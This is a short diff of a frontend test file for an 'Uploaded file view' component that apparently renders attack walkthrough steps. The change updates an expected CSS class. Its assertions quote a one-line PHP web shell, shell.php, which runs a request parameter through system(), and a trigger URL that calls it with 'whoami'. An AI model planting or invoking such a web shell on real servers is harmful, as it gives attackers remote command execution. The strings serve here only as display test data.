@@ -118,7 +118,7 @@ describe("Uploaded file view", () => {
     // The label style capitalises the words; the file name keeps its case (a Linux name is case-sensitive).
     const file = heading.querySelector("[data-upload-file]")!;
     expect(file.textContent).toBe("shell.php");
-    expect(file).toHaveClass("normal-case");
+    expect(file).toHaveClass("payload-block__file");
     expect(d.getByLabelText("Command: Payload").textContent).toBe("<?php system($_REQUEST['cmd']); ?>");
     expect(d.getByRole("heading", { name: "Trigger it" })).toBeInTheDocument();
     expect(d.getByLabelText("Command: Trigger").textContent).toBe("http://198.51.100.20/{UPLOAD_PATH}/shell.php?cmd=whoami");
